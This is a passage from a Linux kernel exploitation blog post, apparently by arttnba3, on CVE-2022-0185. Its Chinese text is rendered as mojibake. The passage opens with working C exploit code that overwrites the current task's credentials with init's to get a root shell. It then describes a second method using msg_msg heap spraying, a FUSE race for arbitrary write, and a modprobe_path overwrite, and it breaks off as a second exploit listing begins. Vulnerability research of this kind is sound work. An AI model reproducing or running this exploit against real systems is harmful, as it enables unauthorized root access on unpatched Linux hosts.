class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] comm_addr[-3]: %lx\n&quot;</span>, comm_addr[<span class="hljs-number">-3</span>]);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] comm_addr[-52]: %lx\n&quot;</span>, comm_addr[<span class="hljs-number">-52</span>]);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] comm_addr[-53]: %lx\n&quot;</span>, comm_addr[<span class="hljs-number">-53</span>]);<br>        <span class="hljs-keyword">if</span> ((comm_addr[<span class="hljs-number">-2</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;cred */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-3</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;real_cred */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-53</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;read_parent */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-52</span>] &gt; <span class="hljs-number">0xffff888000000000</span>)) &#123;  <span class="hljs-comment">/* task-&gt;parent */</span><br><br>            <span class="hljs-comment">/* task-&gt;read_parent */</span><br>            parent_task = comm_addr[<span class="hljs-number">-53</span>];<br><br>            <span class="hljs-comment">/* task_struct::ptraced */</span><br>            current_task = comm_addr[<span class="hljs-number">-46</span>] - <span class="hljs-number">2280</span>;<br><br>            page_offset_base = (comm_addr[<span class="hljs-number">-46</span>]&amp;<span class="hljs-number">0xfffffffffffff000</span>) - i * <span class="hljs-number">0x1000</span>;<br>            page_offset_base &amp;= <span class="hljs-number">0xfffffffff0000000</span>;<br><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%p\n&quot;</span>,<br>                   (<span class="hljs-keyword">struct</span> page*) (vmemmap_base + i * <span class="hljs-number">0x40</span>));<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n&quot;</span>,<br>                   page_offset_base);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m&quot;</span><br>                   <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, current_task);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief find the init_task and copy something to current task_struct</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">privilege_escalation_by_task_overwrite</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m&quot;</span><br>         <span class="hljs-string">&quot;Stage VI - Hijack current task_struct to get the root&quot;</span><br>         <span class="hljs-string">&quot;\033[0m\n&quot;</span>);<br><br>    <span class="hljs-comment">/* finding the init_task, the final parent of every task */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Seeking for init_task...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-type">size_t</span> ptask_page_addr = direct_map_addr_to_page_addr(parent_task);<br><br>        tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (parent_task &amp; <span class="hljs-number">0xfff</span>));<br><br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) ptask_page_addr, buf);<br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (ptask_page_addr+<span class="hljs-number">0x40</span>),&amp;buf[<span class="hljs-number">512</span>]);<br><br>        <span class="hljs-comment">/* task_struct::real_parent */</span><br>        <span class="hljs-keyword">if</span> (parent_task == tsk_buf[<span class="hljs-number">278</span>]) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        parent_task = tsk_buf[<span class="hljs-number">278</span>];<br>    &#125;<br><br>    init_task = parent_task;<br>    init_cred = tsk_buf[<span class="hljs-number">329</span>];<br>    init_nsproxy = tsk_buf[<span class="hljs-number">341</span>];<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>,init_nsproxy);<br><br>    <span class="hljs-comment">/* now, changing the current task_struct to get the full root :) */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);<br><br>    current_task_page = direct_map_addr_to_page_addr(current_task);<br><br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page, buf);<br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (current_task_page+<span class="hljs-number">0x40</span>), &amp;buf[<span class="hljs-number">512</span>]);<br><br>    tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (current_task &amp; <span class="hljs-number">0xfff</span>));<br>    tsk_buf[<span class="hljs-number">328</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">329</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">341</span>] = init_nsproxy;<br><br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page, buf, <span class="hljs-number">0xff0</span>);<br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) (current_task_page+<span class="hljs-number">0x40</span>),<br>                            &amp;buf[<span class="hljs-number">512</span>], <span class="hljs-number">0xff0</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Done.\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> msg_pipe[<span class="hljs-number">2</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">signal_handler</span><span class="hljs-params">(<span class="hljs-type">int</span> nr)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Receive signal %d!\n&quot;</span>, nr);<br>    sleep(<span class="hljs-number">114514</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] CVE-2022-0185 - exploit by arttnba3&quot;</span>);<br><br>    signal(SIGSEGV, signal_handler);<br><br>    pipe(msg_pipe);<br><br>    <span class="hljs-keyword">if</span> (!fork()) &#123;<br>        <span class="hljs-comment">/* create new namespace to get CAP_SYS_ADMIN */</span><br>        <span class="hljs-keyword">if</span> (unshare(CLONE_NEWNS | CLONE_NEWUSER) &lt; <span class="hljs-number">0</span>) &#123;<br>            err_exit(<span class="hljs-string">&quot;FAILED to unshare()!&quot;</span>);<br>        &#125;<br><br>        bind_core(<span class="hljs-number">0</span>);<br><br>        occupy_4k_obj_by_msg();sleep(<span class="hljs-number">1</span>);<br>        corrupting_first_level_pipe_for_page_uaf();sleep(<span class="hljs-number">1</span>);<br>        corrupting_second_level_pipe_for_pipe_uaf();sleep(<span class="hljs-number">1</span>);<br>        building_self_writing_pipe();sleep(<span class="hljs-number">1</span>);<br>        info_leaking_by_arbitrary_pipe();sleep(<span class="hljs-number">1</span>);<br>        privilege_escalation_by_task_overwrite();sleep(<span class="hljs-number">1</span>);<br><br>        write(msg_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br><br>        sleep(<span class="hljs-number">114514</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">char</span> ch;<br><br>        <span class="hljs-keyword">if</span> (prctl(PR_SET_NAME, <span class="hljs-string">&quot;arttPWNnba3&quot;</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            err_exit(<span class="hljs-string">&quot;FAILED to prctl()!&quot;</span>);<br>        &#125;<br><br>        read(msg_pipe[<span class="hljs-number">0</span>], &amp;ch, <span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] checking for root...&quot;</span>);<br>    get_root_shell();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿è¡Œå³å¯å®Œæˆææƒ</p><p><img src="https://s2.loli.net/2023/05/28/945bYFSHmBfLKr7.png" alt="image.png"></p><h2 id="æ–¹æ³•äºŒã€ç»“åˆ-FUSE-msg-msg-è¿›è¡Œä»»æ„åœ°å€å†™"><a href="#æ–¹æ³•äºŒã€ç»“åˆ-FUSE-msg-msg-è¿›è¡Œä»»æ„åœ°å€å†™" class="headerlink" title="æ–¹æ³•äºŒã€ç»“åˆ FUSE + msg_msg è¿›è¡Œä»»æ„åœ°å€å†™"></a>æ–¹æ³•äºŒã€ç»“åˆ FUSE + <code>msg_msg</code> è¿›è¡Œä»»æ„åœ°å€å†™</h2><p>ç°åœ¨æˆ‘ä»¬æœ‰äº†ä»»æ„é•¿åº¦çš„å †æº¢å‡ºï¼Œè€Œå¯æº¢å‡ºå¯¹è±¡ç”¨çš„åˆ†é… flag ä¸º <code>GFP_KERNEL</code>ã€å¤§å°ä¸º 4kï¼ˆä¸€å¼ å†…å­˜é¡µå¤§å°ï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸éš¾æƒ³åˆ°å¯ä»¥åŸºäº<a href="https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">æˆ‘ä»¬çš„è€æœ‹å‹ System V æ¶ˆæ¯é˜Ÿåˆ—ç»“æ„ä½“</a>æ¥å®Œæˆåˆ©ç”¨</p><h3 id="Step-I-å †å–·-msg-msgï¼Œè¦†å†™-m-ts-å­—æ®µè¿›è¡Œè¶Šç•Œè¯»å–"><a href="#Step-I-å †å–·-msg-msgï¼Œè¦†å†™-m-ts-å­—æ®µè¿›è¡Œè¶Šç•Œè¯»å–" class="headerlink" title="Step.I - å †å–· msg_msgï¼Œè¦†å†™ m_ts å­—æ®µè¿›è¡Œè¶Šç•Œè¯»å–"></a>Step.I - å †å–· msg_msgï¼Œè¦†å†™ m_ts å­—æ®µè¿›è¡Œè¶Šç•Œè¯»å–</h3><p>æˆ‘ä»¬å…ˆæ¥å¤ä¹ ä¸€ä¸‹æ¶ˆæ¯é˜Ÿåˆ—ä¸­ä¸€æ¡æ¶ˆæ¯çš„åŸºæœ¬ç»“æ„ï¼Œå½“æˆ‘ä»¬è°ƒç”¨ msgsnd ç³»ç»Ÿè°ƒç”¨åœ¨æŒ‡å®šæ¶ˆæ¯é˜Ÿåˆ—ä¸Šå‘é€ä¸€æ¡æŒ‡å®šå¤§å°çš„ message æ—¶ï¼Œåœ¨å†…æ ¸ç©ºé—´ä¸­ä¼šåˆ›å»ºè¿™æ ·ä¸€ä¸ªç»“æ„ä½“ä½œä¸ºä¿¡æ¯çš„ headerï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* one msg_msg structure for each message */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br><span class="hljs-type">long</span> m_type;<br><span class="hljs-type">size_t</span> m_ts;<span class="hljs-comment">/* message text size */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-type">void</span> *security;<br><span class="hljs-comment">/* the actual message follows immediately */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬åœ¨å•ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸Šå‘é€ä¸€æ¡æ¶ˆæ¯æ—¶ï¼Œè‹¥å¤§å°<strong>ä¸å¤§äºã€ä¸€ä¸ªé¡µé¢å¤§å° - header sizeã€‘</strong>ï¼Œåˆ™ä»…ä½¿ç”¨ä¸€ä¸ª <code>msg_msg</code> ç»“æ„ä½“è¿›è¡Œå­˜å‚¨ï¼Œè€Œå½“æˆ‘ä»¬å•æ¬¡å‘é€<strong>å¤§äºã€ä¸€ä¸ªé¡µé¢å¤§å° - header sizeã€‘</strong>å¤§å°çš„æ¶ˆæ¯æ—¶ï¼Œå†…æ ¸ä¼šé¢å¤–è¡¥å……æ·»åŠ  <code>msg_msgseg</code> ç»“æ„ä½“ï¼Œå…¶ä¸ <code>msg_msg</code> ä¹‹é—´å½¢æˆå¦‚ä¸‹å•å‘é“¾è¡¨ç»“æ„ï¼Œè€Œå•ä¸ª <code>msg_msgseg</code> çš„å¤§å°æœ€å¤§ä¸ºä¸€ä¸ªé¡µé¢å¤§å°ï¼Œè¶…å‡ºè¿™ä¸ªèŒƒå›´çš„æ¶ˆæ¯å†…æ ¸ä¼šé¢å¤–è¡¥å……ä¸Šæ›´å¤šçš„ <code>msg_msgseg</code> ç»“æ„ä½“ï¼Œé“¾è¡¨æœ€åä»¥ NULL ç»“å°¾ï¼š</p><p><img src="https://s2.loli.net/2022/02/24/5IcVxRaFQtg3HCW.png" alt="image.png"></p><p>ç”±äºæˆ‘ä»¬æœ‰è¶Šç•Œå†™ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯æˆ‘ä»¬å¯ä»¥å°† <code>msg_msg</code> ä¸ <code>ctx-&gt;legacy_data</code> å †å–·åˆ°ä¸€èµ·ï¼Œä¹‹åè¶Šç•Œå†™å…¥ç›¸é‚» <code>msg_msg</code> çš„ header å°† <code>m_ts</code> æ”¹å¤§ï¼Œä¹‹åæˆ‘ä»¬å†ä½¿ç”¨ <code>msgrcv()</code> è¯»å–æ¶ˆæ¯ï¼Œä¾¿èƒ½è¯»å–å‡ºè¶…å‡ºè¯¥æ¶ˆæ¯èŒƒå›´çš„å†…å®¹ï¼Œä»è€Œå®Œæˆè¶Šç•Œè¯»å–ï¼›ç”±äºæˆ‘ä»¬çš„è¶Šç•Œå†™å…¥ä¼šç ´å <code>msg_msg</code> å¤´éƒ¨çš„åŒå‘é“¾è¡¨ï¼Œå› æ­¤åœ¨è¯»å–æ—¶æˆ‘ä»¬åº”å½“ä½¿ç”¨ <code>MSG_COPY</code> ä»¥ä¿æŒæ¶ˆæ¯åœ¨é˜Ÿåˆ—ä¸Šä¸ä¼šè¢« unlink</p><p>ç”±äº <code>ctx-&gt;legacy_data</code> çš„å¤§å°å·²ç»æ˜¯ 4k äº†ï¼Œæ•…æˆ‘ä»¬è€ƒè™‘åœ¨ <code>msg_msgseg</code> ä¸Šå®Œæˆè¶Šç•Œè¯»å–ï¼Œç”±äº <code>msgrcv()</code> æ‹·è´æ¶ˆæ¯æ—¶ä»¥å•é“¾è¡¨ç»“å°¾ NULL ä½œä¸ºç»ˆæ­¢ï¼Œæ•…æˆ‘ä»¬æœ€å¤šå¯ä»¥åœ¨ <code>msg_msgseg</code> ä¸Šè¯»å–å°†è¿‘ä¸€å¼ å†…å­˜é¡µå¤§å°çš„æ•°æ®ï¼Œå› æ­¤æˆ‘ä»¬è€ƒè™‘è®© <code>msg_msgseg</code> çš„æ¶ˆæ¯å°½é‡å°ï¼Œä»è€Œè®©æˆ‘ä»¬èƒ½å¤Ÿè¶Šç•Œè¯»å–åˆ°æ›´å¤šçš„ object</p><p>æ¥ä¸‹æ¥è€ƒè™‘å¦‚ä½•ä½¿ç”¨è¶Šç•Œè¯»å–è¿›è¡Œæ•°æ®æ³„éœ²ï¼Œè¿™é‡Œæˆ‘ä»¬è€ƒè™‘å †å–·å…¶ä»–çš„å¯ä»¥æ³„éœ²æ•°æ®çš„å°ç»“æ„ä½“ä¸æˆ‘ä»¬çš„ <code>msg_msgseg</code> æ··åœ¨ä¸€èµ·ï¼Œä»è€Œä½¿å¾—æˆ‘ä»¬è¶Šç•Œè¯»å–æ—¶å¯ä»¥ç›´æ¥è¯»åˆ°æˆ‘ä»¬å †å–·çš„è¿™äº›å°ç»“æ„ä½“ï¼Œä»è€Œæ³„éœ²å‡ºå†…æ ¸ä»£ç æ®µåŠ è½½åŸºåœ°å€ï¼Œé‚£ä¹ˆè¿™é‡Œç¬”è€…è€ƒè™‘å †å–· <a href="https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/#0x02-seq-file-%E7%9B%B8%E5%85%B3">seq_operations</a> æ¥å®Œæˆæ•°æ®çš„æ³„éœ²</p><p>ä¸ºäº†æé«˜è¶Šç•Œå†™å…¥ <code>msg_msg</code> çš„æˆåŠŸç‡ï¼Œç¬”è€…é€‰æ‹©å…ˆå †å–·ä¸€éƒ¨åˆ† <code>msg_msg</code>ï¼Œä¹‹ååˆ†é…  <code>ctx-&gt;legacy_data</code> ï¼Œ æ¥ä¸‹æ¥å†å †å–·å¦ä¸€éƒ¨åˆ† <code>msg_msg</code>ä¸ºäº†æé«˜æ•°æ®æ³„éœ²çš„æˆåŠŸæ¦‚ç‡ï¼Œç¬”è€…é€‰æ‹©åœ¨æ¯æ¬¡åœ¨æ¶ˆæ¯é˜Ÿåˆ—ä¸Šå‘é€æ¶ˆæ¯æ—¶éƒ½å–·ä¸€ä¸ª <code>seq_operations</code>ï¼Œåœ¨å®Œæˆæ¶ˆæ¯é˜Ÿåˆ—çš„å‘é€ä¹‹åå†å–·å°„å¤§é‡çš„ <code>seq_operations</code></p><p>ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬çš„è¶Šç•Œå†™å¹¶ä¸ä¸€å®šèƒ½å†™åˆ°ç›¸é‚»çš„ <code>msg_msg</code>ï¼Œä¹Ÿå¯èƒ½å†™åˆ°å…¶ä»–ç»“æ„ä½“æˆ–æ˜¯ free objectï¼Œè‹¥ free object çš„ next æŒ‡é’ˆåˆšå¥½ä½äºå¼€å¤´è¢«æˆ‘ä»¬ overwrite äº†ï¼Œåˆ™ä¼šåœ¨åé¢çš„åˆ†é…ä¸­å¯¼è‡´ kernel panic</p><h3 id="Step-II-å †å–·-msg-msgï¼Œåˆ©ç”¨-FUSE-åœ¨æ¶ˆæ¯æ‹·è´æ—¶è¦†å†™-next-å­—æ®µè¿›è¡Œä»»æ„åœ°å€å†™"><a href="#Step-II-å †å–·-msg-msgï¼Œåˆ©ç”¨-FUSE-åœ¨æ¶ˆæ¯æ‹·è´æ—¶è¦†å†™-next-å­—æ®µè¿›è¡Œä»»æ„åœ°å€å†™" class="headerlink" title="Step.II - å †å–· msg_msgï¼Œåˆ©ç”¨ FUSE åœ¨æ¶ˆæ¯æ‹·è´æ—¶è¦†å†™ next å­—æ®µè¿›è¡Œä»»æ„åœ°å€å†™"></a>Step.II - å †å–· msg_msgï¼Œåˆ©ç”¨ FUSE åœ¨æ¶ˆæ¯æ‹·è´æ—¶è¦†å†™ next å­—æ®µè¿›è¡Œä»»æ„åœ°å€å†™</h3><p>æ¥ä¸‹æ¥æˆ‘ä»¬è¯¥è€ƒè™‘å¦‚ä½•è¿›è¡Œææƒçš„å·¥ä½œäº†ï¼Œé€šè¿‡è¦†å†™ <code>msg_msg</code> çš„æ–¹å¼æˆ‘ä»¬åŒæ ·å¯ä»¥è¿›è¡Œä»»æ„åœ°å€å†™çš„æ“ä½œï¼Œç”±äºæ¶ˆæ¯å‘é€æ—¶åœ¨ <code>do_msgsnd()</code> å½“ä¸­æ˜¯å…ˆåˆ†é…å¯¹åº”çš„ <code>msg_msg</code> ä¸ <code>msg_msgseg</code> é“¾è¡¨ä½œä¸ºæ¶ˆæ¯çš„å­˜å‚¨ç©ºé—´å†è¿›è¡Œæ‹·è´ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯æˆ‘ä»¬å¯ä»¥å…ˆå‘é€ä¸€ä¸ªå¤§äºä¸€å¼ å†…å­˜é¡µå¤§å°çš„æ¶ˆæ¯ï¼Œè¿™æ ·ä¼šåˆ†é…ä¸€ä¸ª 4k çš„ <code>msg_msg</code> ä¸ä¸€ä¸ª <code>msg_msgseg</code> ï¼Œåœ¨ <code>do_msgsnd()</code> ä¸­å®Œæˆç©ºé—´åˆ†é…ååœ¨ <code>msg_msg</code> ä¸Šè¿›è¡Œæ•°æ®æ‹·è´çš„æ—¶å€™ï¼Œæˆ‘ä»¬åœ¨å¦ä¸€ä¸ªçº¿ç¨‹å½“ä¸­ä½¿ç”¨è¶Šç•Œå†™æ›´æ”¹ <code>msg_msg</code> çš„ headerï¼Œä½¿å…¶ next æŒ‡é’ˆæ›´æ”¹åˆ°æˆ‘ä»¬æƒ³è¦å†™å…¥æ•°æ®çš„åœ°æ–¹ï¼Œå½“ <code>do_msgsnd()</code> å¼€å§‹å°†æ•°æ®æ‹·è´åˆ° <code>msg_msgseg</code> ä¸Šæ—¶ï¼Œç”±äº <code>msg_msg</code> çš„ next æŒ‡é’ˆå·²ç»è¢«æˆ‘ä»¬æ‰€æ›´æ”¹ï¼Œæ•…å…¶ä¼šå°†æ•°æ®å†™å…¥åˆ°æˆ‘ä»¬æŒ‡å®šçš„åœ°å€ä¸Šï¼Œä»è€Œå®Œæˆä»»æ„åœ°å€å†™</p><p><img src="https://s2.loli.net/2023/01/10/JxidQjuHn6ZKs4l.png" alt="image.png"></p><p>ä¸è¿‡ <code>do_msgsnd()</code> çš„æ‰€æœ‰æ“ä½œåœ¨ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ä¸­å®Œæˆï¼Œå› æ­¤è¿™éœ€è¦æˆ‘ä»¬è¿›è¡Œæ¡ä»¶ç«äº‰ï¼Œè€Œå¸¸è§„çš„æ¡ä»¶ç«äº‰é€šå¸¸å¾ˆéš¾æˆåŠŸï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ <a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#userfaultfd%EF%BC%88may-obsolete%EF%BC%89">userfaultfd</a> è®©  <code>do_msgsnd()</code> åœ¨æ‹·è´æ•°æ®åˆ°  <code>msg_msg</code>  æ—¶è§¦å‘ç”¨æˆ·ç©ºé—´çš„ç¼ºé¡µå¼‚å¸¸ï¼Œé™·å…¥åˆ°æˆ‘ä»¬çš„ page fault handler ä¸­ï¼Œæˆ‘ä»¬åœ¨ handler çº¿ç¨‹ä¸­å†è¿›è¡Œè¶Šç•Œå†™ï¼Œä¹‹åæ¢å¤åˆ°åŸçº¿ç¨‹ï¼Œè¿™æ ·åˆ©ç”¨çš„æˆåŠŸç‡ä¾¿å¤§å¤§æé«˜äº†</p><p><img src="https://i.loli.net/2021/09/08/i4C7oOvHdG2RqUm.png" alt="image.png"></p><p>ä½†æ˜¯è‡ª kernel ç‰ˆæœ¬ 5.11 èµ·<strong>éç‰¹æƒç”¨æˆ·æ— æ³•ä½¿ç”¨ userfaultfd</strong>ï¼Œè€Œè¯¥æ¼æ´å½±å“çš„å†…æ ¸ç‰ˆæœ¬åŒ…æ‹¬ 5.11ä»¥ä¸Šçš„ç‰ˆæœ¬ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä½¿ç”¨æ›´ä¸ºé€šç”¨çš„åŠæ³•â€”â€”<strong>ç”¨æˆ·ç©ºé—´æ–‡ä»¶ç³»ç»Ÿ</strong>ï¼ˆfilesystem in userspaceï¼Œ<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#FUSE-race">FUSE</a>ï¼‰å¯ä»¥è¢«ç”¨ä½œ userfaultfd çš„æ›¿ä»£å“ï¼Œå¸®åŠ©æˆ‘ä»¬å®Œæˆæ¡ä»¶ç«äº‰çš„åˆ©ç”¨</p><p><img src="https://s2.loli.net/2023/01/10/9q3VSGepCnKzbuB.png" alt="image.png"></p><p>ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äº slub allocator çš„éšæœºæ€§ï¼Œ<strong>æˆ‘ä»¬å¹¶ä¸èƒ½ä¿è¯ä¸€å®šèƒ½å¤Ÿæº¢å‡ºåˆ°é™·å…¥ FUSE ä¸­çš„ msg_msg ï¼Œ</strong>å› æ­¤éœ€è¦å¤šæ¬¡åˆ†é…å¹¶è¿›è¡Œæ£€æŸ¥ä»¥ç¡®ä¿æˆ‘ä»¬å®Œæˆäº†ä»»æ„åœ°å€å†™</p><p>æœ‰äº†ä»»æ„åœ°å€å†™ï¼Œç°åœ¨è¯¥è€ƒè™‘å†™å“ªé‡Œã€å†™ä»€ä¹ˆäº†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¦†å†™ä¸€äº›å…¨å±€å‡½æ•°è¡¨æ¥åŠ«æŒå†…æ ¸æ‰§è¡Œæµï¼Œæˆ–æ˜¯è¦†å†™ä¸€äº›å…¶ä»–çš„ä¸œè¥¿å®Œæˆææƒï¼Œè¿™é‡Œç¬”è€…é€‰æ‹©è¦†å†™ <code>modprobe_path</code> å®Œæˆææƒï¼Œå½“æˆ‘ä»¬æ‰§è¡Œä¸€ä¸ªæ ¼å¼éæ³•çš„ç¨‹åºæ—¶ï¼Œå†…æ ¸ä¼šä»¥ root æƒé™æ‰§è¡Œ <code>modprobe_path</code> æ‰€æŒ‡çš„åº”ç”¨ï¼Œæˆ‘ä»¬åªéœ€è¦å°†å…¶æ”¹ä¸ºæˆ‘ä»¬çš„æ¶æ„è„šæœ¬çš„è·¯å¾„å³å¯</p><h3 id="FINAL-EXPLOIT-1"><a href="#FINAL-EXPLOIT-1" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>æœ€åç”±ç¬”è€…ç¼–å†™çš„ exp å¦‚ä¸‹ï¼Œå› ä¸ºä¸€äº›åŸå› æš‚æ—¶æ— æ³•è¿›è¡ŒéªŒè¯ï¼Œä½†æ˜¯æ€è·¯åº”è¯¥æ˜¯å¯¹çš„ï¼Œåœ¨ç†è®ºä¸Šåº”å½“å¯è¡Œï¼š</p><blockquote><p>å†…æ ¸åœ°å€æ³„éœ²çš„éƒ¨åˆ†ç»è¿‡éªŒè¯äº†ï¼Œä½†æ˜¯å¯¹äº FUSE è¿›è¡Œåˆ©ç”¨çš„éƒ¨åˆ†ï¼Œç”±äºç¬”è€…åœ¨å¤ç°æ¼æ´æ—¶ä½¿ç”¨çš„æ˜¯ CTF ä¸­ kernel pwn çš„ç®€æ˜“ç¯å¢ƒï¼Œæ•…æ²¡æ³•ä½¿ç”¨ FUSEï¼š(</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span 